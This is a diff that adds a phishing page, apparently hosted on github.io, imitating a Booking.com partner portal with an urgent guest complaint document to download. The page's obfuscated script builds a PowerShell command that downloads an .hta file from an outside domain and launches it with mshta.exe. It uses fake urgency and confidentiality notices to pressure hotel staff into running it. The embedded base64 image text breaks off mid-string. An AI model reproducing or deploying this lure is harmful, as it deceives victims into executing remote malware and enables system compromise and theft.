@@ -1,0 +1,556 @@
+<!-- url: https://resewqas.github.io/sgc-bsrfooklng.com/
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Booking.com - Guest Complaint Resolution</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <style>
+        :root {
+            --booking-blue: #003580;
+            --booking-light-blue: #0071c2;
+            --booking-orange: #ff5a5f;
+            --booking-green: #008009;
+            --booking-dark-gray: #262626;
+            --booking-gray: #6b6b6b;
+            --booking-light-gray: #f5f5f5;
+            --booking-white: #ffffff;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'BlinkMacSystemFont', 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8ed 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: var(--booking-dark-gray);
+        }
+        
+        .booking-container {
+            background: var(--booking-white);
+            border-radius: 8px;
+            box-shadow: 0 2px 16px rgba(0, 53, 128, 0.15);
+            width: 100%;
+            max-width: 560px;
+            overflow: hidden;
+            border: 1px solid #e0e6ef;
+        }
+        
+        .booking-header {
+            background: linear-gradient(135deg, var(--booking-blue) 0%, #0046a0 100%);
+            color: var(--booking-white);
+            padding: 24px 32px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .booking-logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: white;
+        }
+        
+        .header-text {
+            flex: 1;
+        }
+        
+        .booking-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 4px;
+            letter-spacing: -0.2px;
+        }
+        
+        .booking-subtitle {
+            font-size: 14px;
+            opacity: 0.9;
+            font-weight: 400;
+        }
+        
+        .partner-badge {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .booking-content {
+            padding: 32px;
+        }
+        
+        .document-info {
+            background: #f8fbff;
+            border-radius: 8px;
+            padding: 24px;
+            margin-bottom: 24px;
+            border: 1px solid #e1ebf7;
+            position: relative;
+        }
+        
+        .document-name {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--booking-blue);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .document-name i {
+            color: var(--booking-orange);
+        }
+        
+        .document-details {
+            font-size: 14px;
+            color: var(--booking-gray);
+            line-height: 1.6;
+            margin-bottom: 16px;
+        }
+        
+        .guest-info {
+            background: #fff9f2;
+            padding: 16px;
+            border-radius: 6px;
+            border: 1px solid #ffe4cc;
+            margin: 16px 0;
+        }
+        
+        .guest-info-title {
+            font-weight: 600;
+            color: var(--booking-orange);
+            margin-bottom: 8px;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .guest-info-text {
+            font-size: 13px;
+            color: var(--booking-gray);
+            line-height: 1.5;
+        }
+        
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 4px;
+        }
+        
+        .info-label {
+            font-weight: 600;
+            color: var(--booking-dark-gray);
+        }
+        
+        .info-value {
+            color: var(--booking-gray);
+        }
+        
+        .sensitive-data {
+            color: var(--booking-orange);
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+        
+        .document-meta {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 16px;
+            font-size: 12px;
+            color: var(--booking-gray);
+            border-top: 1px solid #e8f1fb;
+            padding-top: 16px;
+        }
+        
+        .action-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 24px 0;
+        }
+        
+        .btn {
+            padding: 16px 24px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn-primary {
+            background: var(--booking-light-blue);
+            color: var(--booking-white);
+        }
+        
+        .btn-primary:hover {
+            background: #0061a8;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 113, 194, 0.3);
+        }
+        
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+        
+        .loading {
+            color: var(--booking-light-blue);
+            font-weight: 600;
+            margin: 16px 0;
+            display: none;
+            font-size: 14px;
+            background: #f0f7ff;
+            padding: 16px;
+            border-radius: 6px;
+            border: 1px solid #d6e8ff;
+            text-align: center;
+        }
+        
+        .security-notice {
+            background: #fff9f2;
+            border-radius: 6px;
+            padding: 20px;
+            margin-top: 24px;
+            border: 1px solid #ffe4cc;
+        }
+        
+        .security-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #b35900;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .security-text {
+            font-size: 13px;
+            color: #b35900;
+            line-height: 1.5;
+        }
+        
+        .booking-footer {
+            padding: 20px 32px;
+            background: #f8f9fa;
+            border-top: 1px solid #e9ecef;
+            font-size: 12px;
+            color: var(--booking-gray);
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: var(--booking-gray);
+            text-decoration: none;
+            transition: color 0.2s;
+            font-weight: 500;
+        }
+        
+        .footer-links a:hover {
+            color: var(--booking-light-blue);
+        }
+        
+        .copyright {
+            text-align: center;
+            margin-top: 8px;
+            opacity: 0.8;
+        }
+        
+        .urgency-badge {
+            background: var(--booking-orange);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            margin-left: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .status-indicator {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: #fff3cd;
+            color: #856404;
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 600;
+            border: 1px solid #ffeaa7;
+        }
+        
+        @media (max-width: 480px) {
+            .booking-header {
+                padding: 20px;
+            }
+            
+            .booking-content {
+                padding: 20px;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                gap: 8px;
+                align-items: center;
+            }
+            
+            .btn {
+                padding: 14px 20px;
+            }
+            
+            .info-row {
+                flex-direction: column;
+                gap: 2px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="booking-container">
+        <div class="booking-header">
+            <div class="booking-logo">Booking.com</div>
+            <div class="header-text">
+                <div class="booking-title">Partner Support Center</div>
+                <div class="booking-subtitle">Guest Complaint Resolution</div>
+            </div>
+            <div class="partner-badge">PARTNER PORTAL</div>
+        </div>
+        
+        <div class="booking-content">
+            <div class="document-info">
+                <div class="status-indicator">Response Required</div>
+                <div class="document-name">
+                    <i class="fas fa-file-contract"></i>
+                    Guest_Complaint_Case_45892.pdf
+                    <span class="urgency-badge">Urgent</span>
+                </div>
+                <div class="document-details">
+                    A formal complaint has been submitted by a guest regarding their recent stay at your property. 
+                    This document contains the complete complaint details, guest statements, photographs, 
+                    and the required resolution steps according to Booking.com policies.
+                </div>
+                
+                <div class="guest-info">
+                    <div class="guest-info-title">
+                        <i class="fas fa-user-circle"></i>
+                        Guest & Stay Information
+                    </div>
+                    <div class="guest-info-text">
+                        <div class="info-row">
+                            <span class="info-label">Reservation ID:</span>
+                            <span class="info-value sensitive-data">56••••••••</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Guest Name:</span>
+                            <span class="info-value sensitive-data">•••••• ••••••••</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Stay Period:</span>
+                            <span class="info-value">Oct 10 - 12, 2025 (2 nights)</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Room Assigned:</span>
+                            <span class="info-value sensitive-data">•••</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Complaint Type:</span>
+                            <span class="info-value">Service Quality & Cleanliness</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="document-meta">
+                    <span><i class="far fa-file-pdf"></i> PDF Document • 1.8 MB</span>
+                    <span><i class="far fa-clock"></i> Received: October 15, 2025 • 14:23</span>
+                </div>
+            </div>
+            
+            <div class="action-buttons">
+                <button class="btn btn-primary" onclick="startProcess()">
+                    <i class="fas fa-download"></i>
+                    DOWNLOAD COMPLAINT DOCUMENT
+                </button>
+            </div>
+            
+            <div id="loadingMessage" class="loading">
+                <i class="fas fa-spinner fa-spin"></i> Preparing complaint document for download...
+            </div>
+            
+            <div class="security-notice">
+                <div class="security-title">
+                    <i class="fas fa-lock"></i>
+                    Confidential Document
+                </div>
+                <div class="security-text">
+                    This document contains sensitive guest information and proprietary Booking.com data. 
+                    Unauthorized access, distribution, or disclosure is strictly prohibited. 
+                    All document access is logged and monitored in compliance with GDPR regulations 
+                    and Booking.com Partner Terms.
+                </div>
+            </div>
+        </div>
+        
+        <div class="booking-footer">
+            <div class="footer-links">
+                <a href="#"><i class="fas fa-question-circle"></i> Partner Help Center</a>
+                <a href="#"><i class="fas fa-shield-alt"></i> Privacy Policy</a>
+                <a href="#"><i class="fas fa-file-contract"></i> Terms & Conditions</a>
+                <a href="#"><i class="fas fa-headset"></i> Contact Support</a>
+            </div>
+            <div class="copyright">
+                © 2025 Booking.com B.V. All rights reserved.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Сильно обфусцированный код
+
+	const _0x1a2b3c = () => {
+  	const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+  	return chars.charAt(Math.floor(Math.random() * chars.length)) +
+         chars.charAt(Math.floor(Math.random() * chars.length));
+};
+
+        
+        const _0x2f8a4d = () => {
+    const _0x3d4e5f = _0x1a2b3c();
+    const _0x7a3b6c = [
+        'powershell -Command "Invoke-WebRequest https://bknvrd.com',
+        ' -OutFile ',
+        "'%PROGRAMDATA%\\\\",
+        _0x3d4e5f,
+        ".hta'; Start-Process mshta.exe -FilePath '%PROGRAMDATA%\\\\",
+        _0x3d4e5f,
+        ".hta'\""
+    ];
+    return _0x7a3b6c.join('');
+}
+
+        // Base64 encoded JPG image (заглушка)
+        const getJpgBase64 = () => {
+            return '/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAA0JCgsKCA0LCgsODg0PEyAVExISEyccHhcgLikxMC4pLSwzOko+MzZGNywtQFdBRkxOUlNSMj5aYVpQYEpRUk//2wBDAQ4ODhMREyYVFSZPNS01T09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0//wAARCAEKAZADASIAAhEBAxEB/8QAGwABAAIDAQEAAAAAAAAAAAAAAAUGAQMEAgf/xABHEAABBAIBAwIEBAMDCAYLAAABAAIDBAUREgYhMRNRFEFhcSIygZEHFaEWM0IjUmJ0orGywTU2cnOCkhckN0RTZHWDk9Hh/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/APpKIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiysICIiAiIgIiICysIgLKwiAiIgysIiAiIgIiIMrCIgysIiAiIgIiICLXZnjq1ZbExIjhYXuIGzoDZVW/9I3TQ82LH/4HILaihMH1Xic9afWx0sr5I2eo4OjLe2wP+YU2gIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiDKwiygwiIgIiICIiAiysICIiAiIgIiIMrCysICIsoMIiICIiDhzv/QGR/1WX/gKpH8NWYh3T0xyLaBl+Jdr4gM5a4t/zu+ld87/ANAZH/VZf+Ar5x0L0jic/hZbeQE5lZOYxwk4jQa0+31KD6RQixQe5+OjpB4GnOrhm9ex4/ZVix/EKvBkLtH+W2JJ68piiZG/kZnB2uw128b+am+n+msb08ZzjhKPX48/Ufy8b1rt9Sql0ZEx/wDEfPyOaC+J0pYT/h3Jo/0QTtzrCTH9MV8xdxMsck05hNYv4uZ+bvsj/R9vmsYzrJ2WzEFWjibD6cjuD7h3waeO+3bXnt3K4v4sE/2Yrn/5tv8AwOVkwkQrdMUY6zQONRhaB78N/wC9BDZnreGnknYzFUJ8ndYSHsi/K0jyNgEkj5+y8YrrqOfKMxuYxs+LsyEBnqHbST4B2ARv38KL/hK2N8GUnfo2jKwPJ/NxIJ/qd/svX8XGxChjpewsCV4YR548dn+ukFj6o6mi6bFMzVnTCy8s2H8eGtdz2O/P9FowfVUuayxggxNmKgWOdHckBAfr2Gtd/uq7/FLm/HYL1vzuc7n9y1u19GjY2KNscYDWMAa1o8ADwEGUREBERAREQEREBERAREQEREBERAREQZWERAREQEREGVhEQEREGUREGEREBERBlYREBERAREQc+RruuY21VY4NdPC+MOPgEtI3/VUOh0R1NjYDBQ6jZXiLuRZGHAE+N/0C+iIgrnTeIz+OvSy5jNm/C6Pi2Pv+F2wd9/oD+68YDpmxiupsplZbMUkd0uLWNaQW7fy7qzIggOssBN1HiI6cE8cLmTCQueCQQGka7fdTFCB1XH1qznBzoYmRlw8EgAb/AKLeiCk5Do3I1MxLlOlskylJOSZIZB+Hv3OuxGt99Edko9G5G7losl1XkmXXwEGOCMfg7HY32A1vvoDv81dkQVnrPpqfqNlEQWYofhpHPd6gJ5b17fZWZEQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERARRnUly3j8Dbu0Ax01dok4vbsFoI5f02o7qnqGfGYirZxUcc01o82NeNgxhhe4/sP6oLIihMnmJGtw7caWF+TnYGlw3qLjycf20ttbJshjyE9/IVXQwWjECxpb6I7AMd7u2R+6CWRcFPN4u9cfUqX4Jp2Aksa7voeSPf9F4t57FVLZpzZCvHa1r03O7gnwD8h+qCSRQeDzLXdJU8rmLUUZfHyklfpg3sj/l4XZVzuKt1Z7Na9C+Ku3lMQSDGPcg9wEEgi5336kbKz32I2ttODYCT/eEjYA+4XmfJUaz5mWLUUboIxLKHO1wYToE/qg6kXFjctj8q2R2PtMnEZAeG7BbvxsH3W29fp46uZ71mKvFvXKR2tn2HuUHQijmZ3Evx7r7chX+FY7g6Qu0A7/N99/Req2ZxlulNcrXYpK8AJleD/d6GzseR2Qd6KNgz+HsXWU4MjXfYeNtYHfm7b0PlvXy8rNzPYig+RlvIQRPicGva49wSN+Pt3QSKLmfkKTKHx77ULahaHiYvHAg+DtaKWdxV9kzql+GUQt5yAHRY33IPfX1QSCKD6f6lp5uSxFFLCJo5ZAyNjyS6NpAD/Hz2pG7k6GPLRetwwFzXPb6jtbDdbP9Qg60Udbz2JpQwS2shBGywwPi2dl7f84Ad9fVbrGUoVqDb09yFlV+uMpf+F2/Gvf9EHWi5KOTo5Gs6xStxTRMJD3Nd+Ujzvfj9VBZnqqmaI/k2SryWBYiaQ3R20vDXa35HfyEFoRaL1yChUltWpGxwxDbnOOgPkP6qsz9Vi50g7JY6eKO4x0PqxtPP0ucgGjse20FtRcFLN4q/cfVpX4Jp2bJYx3cgHuR7j6haKmTjhpXbWSyVR8MFl7DIwcGxgEAMdvy4f8ANBLIuTHZOlk4nS0LLJmMdxdx2C0+xB7hROUvZd3U0OKxc9WBrqZsOdPCX9w/jrsR9EFhRVK11FlKeHzgsx1hkcX6ZD4wTHI1+tHROwdb7LotW+pcTVdfs/y/IVYm85o4Y3RSBnzLdkg6HfRQWVFXMnlchNk8TVwlisyO/XkmEk0ReNAAjsCPkVL42PIxwvGUsV55eX4XQRGMAa8EEnug7EVWz3UDY+oK+Jhy8GPAY59iUsD3B3bizR7DYO1szOVu08FnbUF2vJNUl1F6cfeEbb+F2+xPdBZUXFfy2Pxkcbshbig9T8oce7vfQHddNexDarssVpWSxSDbXsdsOH3QbEREBERAREQEREBERAREQeJomTwyQyjccjSxw9wRoqjdIwSXsn8HeYXMwdaSkeXhznPI2P8A7bQP1V8XlsbGFzmMa0vO3EADZ9z7oKN0eyafNNqWWkjp+CSqHH5vc8gEf+BoXNk9HprqwO8HMAH/AM0a+hNjYxznNY1rnnbiAAXff3Xk14S17TDGWvdycOA04+59yggs3FHF1H016TGs4WJY28RrTfSPb7dlGYS9iqeDylTLywttmzP8XDIR6kpc48dNPd2xrWlcnMY5zXOY0uadtJGyPt7Lw6tXfO2d8ETpm9myFgLh9j5QUKg6ODC9G27paMfC6T1XO/Ix5BEbne3fff5KZc+nlutYjRkjsRMoSx3ZIiHNIcRwaXDsT5OlZhDEIfRETBFrXDiOOvbXhYhghrx+nBFHEze+LGho/YIPnUcFvJUH0hy9fpus8MPvO2T8H3/BH/tKUhbRzmHy2WvWvg62RsxthndocGx6DCd9vz8vKubY2NLi1jQXnbiABv7+6x6MXo+j6Ufpa1w4jjr7eEEH05lbNy9dpWZqlw1WsIu1Rpsm9/hcO4Dh9DruufMSwVOtMZayjmMpfDSMgkk/JHOXA9yewJb4KskMMUEYjgiZGwf4WNDR+wWZYo5ozHNGyRh8te0EH9Cgrmaz9eNtQY2xj3Czb9J9yTT4oHBu9kgjbtaA7qC9YyzdWv8A5hFdJxg5TQxhjHEB47aJB143sq+fC1vh/h/h4fR/+H6Y4/trSy2tAxpayCJrS3gQGADj7fb6IKnkoYoujunzGxrPTsUnM4jWiSNkffZXfhYondZdSSljTIHV2ciO4aY9kKfMUbmNY6Nha3Ra0tGhrxpZaxjXue1jQ5+uRA7n7+6D57U9OHB4Se2B/LauVm9bY21g5PDCfoHfspyzZq5HrPDuxk0Vh9eOY2pIXBwbEW6a1xHbu7wFZRFG2MxtjYGHe2ho0d+eyxBXgrMLK8McTSdkRsDQf2QV/pCaBrspUMkYtMyNhxiJAeGlwIOvOu47+F6y8Uc3W2BErGvDIbL2hw3ogN0VPCCETmcRRiVw0ZA0ciPbfleixhe15Y0vaCGuI7jfnRQUuZ81TrbKOkylPHGaKL4d9qEOEkYbohpLgBo72PmsxW24XF4unSv0JorlqYsvyx6gg7k6aN+dkgd9K4T1oLLQ2xBFK0HYEjA4D91mSCGWH0ZYY3xf5jmAt/bwg+dWHT2oOrhWuNvyOgrl8teMMEgBPPQBO/wgjeztSXVOTwdvDY2GhPWmcLUDoGREExNDgCSB+Ua7d/mrpHDFEdxRMYdBv4Wgdh4HZeG06rOXCtA3mQ52o2jkR8z27oPdhvKGVutktd2/RUF89Sx/CqKCOWJ8kTa7J2Bw5MPqgacPI+flfQVpFWsPU1XhHqHk/UY/Efc+6CFzcccfUfTZjY1hbYljbxGtN9I9h9OwUNThp2MLk2Xb7aPHOzPhsO1pkrXAt3vsfn2Ku7mMc5rnNaXNO2kjZB+i8mvAY3xmGMseduaWDTj7kfNBDdM5WfIvvw2H1bDqkrWC3VGo59t39e48HvpcGVqzXOvq8UF+em4YtzjJCGlxHq+PxA9v/wBK1RRRwxiOKNkbB4axoAH6BPTZ6nqcG89ceWu+vbaCpdTYmviuh8wIXyyyzhr5p538nyO5NGyf+QXXlupcY/FS1cbaiv3bERihr1neo5ziNd9eAN7JKsT2MkYWSMa9p8tcNg/ovMVeCDfowxx788GBu/2QUy1h+OX6XxUtmeJ0NGVjpK8pjdtrW70R8lbcdSbj63oNsWZxyLudiUyO7/LZ+S6DGwva8saXtBDXEdxv2K9IK/aa09eUtgHePm+X+m1QWW/6vdad/wD3wf7o1ezGwyCQsbzA4h2hsD22vJrwObI10MZbIdvBYNPP190FPvPnrdcSyyZKrjzLSjbWlswh7XAE82tJcADvuR81I4KbH4bGPfLmK1iG1ed6ckbOMYkd5Y0AntsE+yn568FhnCxDHKwHfF7A4fsU9CExsjMUfBhBa3gNNI8aHyQbEREBERAREQEREBERAREQc2SsupYy3ba0PdBC+QNJ0CWtJ1/RV5vUWYq0auSyeMqjH2PTLpK9gufEH60S0jv5HhTXUP8A1cyf+qS/8BUFiMHcyOFxYymV9ai2KGVtWKuI+WmgtDnbJIHb22gmMZkZ7eYzFSUMEdKWNkeho6cwOO/fuu2vep2nvZVt15nx/nbHK1xb9wD2VKzT7EdbrR1YuDvWgDi3yGFjQ7+m130cTYGTxNuJ+DrRw7DPg+QdNGW929/zD5/ogsxvUxaFU264sHxF6reZ/wDDvaWb1Oo9jLduvA5/5GyytaXfbZ7r5/mrH8w6ZtZavRxNOu+flG47NpzxJ52NacSN679lM5+t8Dkchm/Sx2RrmBgtVbJAkja0f4CdjuDvRHdBabVyrTYJLdmGBhOg6WQMBP3K2sc17A9jg5rhsOB2CFR3mfIdYyPjix7gaELqkWQa46jcNu4gdt77FWDpajLj8ZJXksVpWixI6NtYksiaTvgN+x2g0W81M/qeLEU7VGFjI2yzPlPJzyX69No2NO0P6jspGjde9rxelpMkNh8UTYZuXIDwDv8Axe4UPHQpO/iJO91OAuFCOYExjYk9R34/+12HfyosMqO6VzbrZc1zMtO6u6Mf5QTcxw4fXf8ATaC8erF63o+oz1Q3lw5Dlr3150o/IZynj8nTozyRtfZ5kudI1oiDW727fv4CjujiZY71i9v+cmfheDgAWEfka3/Q49x791r6hpUJeq8C63VrPExnZIZWNPPUY4g786+SDugzsYy2Vr3p6tetUdC2KR7w3lzZyOyTo/TSlzNE2D13SxiHjy9QuHHXvvxpVrGY+la6wz77FWGb0/h2MEjA4NaY++ge3yCrzmy/2ew9Ueh8GMrNG5tkn0vwud6bXa/w7+Xjwg+h1rVa5F6tSxDPHvXOJ4eN/cL1PPDXidNYljijb+Z8jg1o+5KgMLjbNXqGxbmlxkQmrBr61LY2Q78LyD9Nja5erWzzdRYODVR0LvVc1tvfoulAGt68nW9ILMy5Vkq/FR2YHVwN+qJAWf8Am8ILtQuc34qDk14Y4eo3YcfAPfyfZUvJ46xSwPU0ksuPDZ4GOdXp74xvHYuIPgka/ZdfUeKo1+n8bVgqxxxS3qrZOLdF+z3JPknue/1QWc5CiKpsm5WFcHiZfVbwB9t71te47dWWsbMVmF9cAkytkBYAPPfwq3cqUIutcfUsVq8dEU5HVoixrYzNzG9DwXcVHZFkENnquLGtY2p/K+UzYgODZ9O+Q7A8fKC7RWa80j44Z4pHx6L2seCW78bA8bUWzNCPPZKpdlrwVasULmSPcGd38tgknXy7Ld09QqUsRV+FrxxufBGXva0BzzxB24+Sdk+VDRQ4+b+IWSbebC+UVITCyXRHg8iAe2/H6EoLO21Wc2JzbEJbN2iIeCH/APZ9/wBF6dLG2VsTpGCR4JawuG3AedD5qiCkJaOelw7W+hj77bVAM/L6jGgyNb9D3Hbt3U3gpo81nLmcjPKtHG2rUP00HSH9yB+iDf1Hmn4+WlSqT1IrNuQt9Sy78MTACS4jY9tD5bUi+/VpwQfzC/Vje9o/E6RrA867loJ8KD6mpVLPUfT/AMRVgl9WeRj+cYdyaIyQDvyN99LXh62Pmz2e/mUNZ9mOcMY2ZrTwr8Bx4g+G+fCCWzmTloNxrq3puFu9FA4uGxwdvZH17eUxWRnt5bMVZgwR0p2MjIGjosDjv9VUqxBxOObCSaTepA2md7Ho8jrX03vS95d0rYerjGXtYblcTFnkRFref9N/ogu1fIUbUroqtytNIz8zI5WuLfuAVsFqua5sCxEYR5k5jj5158eVV89XxlcYR+Hiqx2vjYhWNcNBdH/i8eW8fKj5qwluWuj9lsdjIGfTe2q7m+odfTmNfqgvMszIy1hkjbI8H02vdrkQN9vf9Fy0Lpfj60t+amyeVpJ9GUFjtbJ4k+RruVWenZpcvfglsjb8Rj3V5N/KdxLXf7Mf+0uGjWht4voeCzG2SJzpOTHDs7TSdH6dvCC+VrVa5GZKliGdgOi6J4eAfbYXj+Y0PUkjN6rzi/vG+s3bO+u4327qp5ON+OzOfbiIhC9+HbNxhbr8Yc4cgB89Ljz1bp6LoSs+myn6xEPoSN4+o93JvLZ8ntve0F/lkjhjdJK9rGNG3OcQAP1KrtnqlknSUmZxwi9VvA+jI4OLA6QN/EAe3ZWGxDFZhkhsRMlieNOY9ocHfcFfPW16jf4TukgihbNK2MTPY0B7iJtfiI79vqgv8VypPPJBBagkliOnsZIHOb9wD2WJL1OKyytLbgZO/wDLE6Voc77De1X8lQp4/qTp11GtFXJmlhcY2hvJnpk6OvPcfNQGOx9rKYvKib+TetLYmbZmtcvWicCdHfy0NEfJBf7V2pSDTctQVw86b6sgZv7bXqe1WrwevYsQxQ9v8o94a3v47nsqpkKFiCWLK+rjclNXoMiswWnDTgO5exx3rl38jRXHYmOSz+FdUgpR1X431akF5p9MOJGwAO3IN1r6IL1FLHNE2WGRkkbhtr2OBBH0IXpQfTFCbHi+2Sak5ktj1Gw1CeEJLRybo+N9jr6qcQEREBERAREQEREHiWKOaF8UzGvjkaWva4bDgexBSKKOGFkMTGsjjaGsa0aDQOwAXteS9oY53IEN3vR3pBrZVrsknkZBGH2CDMeP95oa7+/bsuanhMTQsGxSxtWCbv8AjjiAI+x+X6Lbjb0OTx8F2sHiKdvNgcNHX1C6QQ4baQR47HaCOf0/hpJ5Z34qm6SbfqOMQ27fle7OFxVy0LVrHVZpxrUj4gT28fdd2xsDY2fHfyhIaNuIA8dzpBy38Xj8kxjchSgshn5fUYDx+3st1WrXpwNgqQRwQt/KyNoaB+gW1EGoV4BaNoQs9dzBGZNfiLQdgb9trSMZQa5rm04QWzGdp4eJD5f9/qutEGptWuy0+02FjZ5Ghj5APxOA8An5rXeoU8jCIb9WGxGDyDZWBwB910og0w1K8EsksEEcckvHm5o0XcRpu/sOy8fy+l8I+oakBrSEl0RYC1xJ2SR9+66UQclDF4/Ghwx9KvW5/mMUYaXfcrZcp1b9cwXa8ViInZZI0OG/db0QcMOHxlelJThx9aOtL/eRtjAa/wC/uumerXsMjZPCyRsb2vYHDYa5vgj6hbUQc92jTyEHo3q0NiPe+MrA4A+/0XmHGUIKL6MFOCOq8EPiawBrgfOx811Ig8xsZHG2ONoaxoDWtHgAeAuS3h8Zde99zH1p3ScebpIw4njvX7bK7UQRt+O5SxzK3T9Gry7sa1zxGyEEfm0B37/JbcLjY8RiK1CI8hCzRdrXJ3lx/UkldqINUtaCaWGaWJj5ICXROcNlhI0SPbsue9h8ZknsffoVrD2DTXSRgkD237LtRBofSqyRwxvrRFld7XxN4DUbh4IHy0ssqVo5J3sgja6wdzEN/vDrXf37dluRBw0sLiqE7p6WOq15Xdi+OMA69vouj4St8b8Z6EfxPD0/W4/i473x37bW5EGmGpWrumdBBHGZ3l8pa3XNx8k+5XiPHUom1mx1IWirv0AG/wB1vsePsulEGiWswSS2oIYfjHRem2Rw8gbIBI762qrJgLmQd6EuFxOMjlka61YgeHyStDg7i3TRrZA8lXFED5rhGFxQFgDHVQLJDpgIwBIQdjfv37ruRBqlrwTSxSyxMfJC4ujc4bLCRokfouS3g8RdtfE28ZUmm+b5IgSfv7/qpBEHDcw2KvSsluY6rPIwBrXSRAkAeB9vott3HUb9dsF2pBPE38rJGAhv29v0XSiDRTpVaEAgpVoq8QO+ETA0b9+3zW9EQEREBERAREQEREHHl60tzE26tef4eWaJzGS71xJHlVnFUccx9rCX8FDSuOp83+lJyjsxtP5tjvvlrz3VttVoLlWStajEkMreL2HwQuTG4XHYt8klKsGSSANc9z3PcQPltxJ19EFIjrsofw8x0uPhEcmSlgjtyNkLC9pcd7d/h3439VO4jEXaGehnr4uti6boXxzxRWvUEp8tdx0O4Pz+ql6/T2Jr1rNaKkwQWv72JznOYe5PYE6b3Py0s47A4zGTmenXc2XgWB75XyEN9hyJ0Ow8IKfh8PirH8PzkbPe1HDK5tkyEOgc1zuIad/h0QO3z39V1WaFy7Bjs1fx0WXi/l0YnqyScXxO1yc9oPYk/oey6+nekKLMLU/m+Nb8YzkZWueS1x5ktLmg8XdteVNZDp/FZKf17tT1JOAYSJHM5NHgENIBHf5oNWMrYq4MblajXgtq8KwdIQRGfkW77691MLjbiqDble2yqxs1WIwwubsBjD8gPC7EBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBZWEQEREBERAREQEREBERARFCVeo4reebjIadlrXRvkE8rODXcSAeIPcjZ89kE2iKJzWZlxtujUrUH3J7peGMbK1muIBPd3bwf6IJZFE4rNfHW56NqlNRuwNEjoZXNdth7BzXDsRtSyAiAg9wQfsgPnRHbz9EBE2NkbGx5Hso/KZRuMmoNlhLo7dgVzIHaEbiPw79960gkEURluoK2LyuOoTRuc+8/jyB7R9wAT9ydLfZyggzNTGMgdLJYiklcQ4ARtbrz9ydIJBFz4+exYpRTW6pqTPB5Ql4eW9/cdj7roBBHYg/ZARR3UGSfiMJayEcTZXwNBDHHQO3Ad/3UhscQToBBlERARNjWyRr7qL6ly4wWDsZD0xI+PiGMJ1ycToD/AJ/oglEXz7A/xFnu2pWZChFHBFC+Z8sLztjWj2PnZ0Pl3KmoOu8Hat16tN9ieew9sbWNhLdEnXcnSCzoi1/EQ/Eit6rPXLPUEe/xcd63r22g2IigbWeutzFvHY/CyXXVGsdI9thjPzjY7O/VBPIuHDZSHL0fiYY5Ii17o5IpBp0b2nRaV3ICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgKvWv/aBj/wD6fN/xtVhXO6lWffjvOj3ZjjMTX7PZpOyNeEG8EEkAjY8jfhVjqj4v+0vTvwHofEcrHD198P7sb3rv4U9Xx1StetXYIQ2xb4+s/ZPPiNDt4C9T0a1i5WtzR8p6pcYXbP4eQ0fv2QVvIYq3Di85lspZimuy498LWwMLY4owCdDfc7PfZUdkqTcb0vjBSY8y5OWtFclM5a6VpbviX/4QT27eB2V4s14rdWWtYZzhmYWPbvW2kaIWqfHU7